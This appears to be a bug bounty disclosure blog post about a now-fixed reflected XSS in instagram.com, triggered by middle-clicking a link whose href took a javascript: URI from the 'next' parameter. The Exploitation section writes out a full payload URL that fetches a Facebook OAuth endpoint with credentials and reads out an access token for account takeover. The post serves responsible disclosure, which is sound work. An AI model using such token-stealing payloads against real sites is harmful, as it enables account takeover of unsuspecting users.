---
id: 695
title: 'One-click reflected XSS in www.instagram.com due to unfiltered URI schemes leads to account takeover'
date: '2021-05-13T19:38:08+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=695'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

On the desktop version of [www.instagram.com](https://www.instagram.com/?fbclid=IwAR2TPZWcXtnfV00I0gnSOCG6GKT3jZP58MjVXAe6JcxB9QKJdAQHDOTPzfM), it’s possible to exploit a reflected XSS bug in some scenarios when the user clicks on a button or a link using the middle mouse button ( used to open or close tabs ).

**Details**

This bug occurs because the payload inside a parameter passed to the vulnerable endpoint is reflected inside the **href** attribute of a html **a** tag.   
The payload could be a javascript URI scheme which would lead to execution of attacker Javascript code in the context of **www.instagram.com**. However, it seems that there’s already a fancy javascript code embedded that would do some event delegation replacing the onclick event of **a** elements. The event handler would replace the destination url to another format an though the attack would fail.   
Likely, it was possible to achieve XSS and then account takeover in a scenario where the user would click on the link/button using middle mouse button or clicking on both right and left buttons in the same time.   
These clicks are commonly used in browsers to open the URL in a new tab. The browser opening it in a new tab would bypass the Javascript code that replaced the destination URL and thus the attack would be successful.

**Exploitation**

The victim would visit this link **https://www.instagram.com/accounts/recovery/landing/**?token=true&amp;next=javascript:fetch(“**https://www.facebook.com/x/oauth/status?client_id=124024574287414&amp;input_token&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fwww.instagram.com%2F&amp;sdk=joey&amp;wants_cookie_data=true**“,{mode:”cors”,credentials:”include”}).then(function(a){alert(a.headers.get(“fb-ar”));console.log(a.headers.get(“fb-ar”));});

This would request a Facebook access_token from the /x/oauth/status Facebook OAuth endpoint that would be generated in the context of the Instagram application which is a first party application and its access tokens could be used to takeover the Facebook account. Moreover, this could be also used with other methods or targeting other endpoints to achieve Instagram account takeover by stealing a login nonce for example.

Special thanks to **[yaala](https://twitter.com/yaalaab)** who introduced the endpoint to me and suggested to take a look.

**Timeline**

Apr 4, 2021— Report Sent   
Apr 4, 2021— Acknowledged by Facebook  
Apr 7, 2021— Fixed by Facebook  
May 11, 2021 — $9600 bounty awarded by Facebook (Including bonus). The amount is reasonable since the attack required user interaction.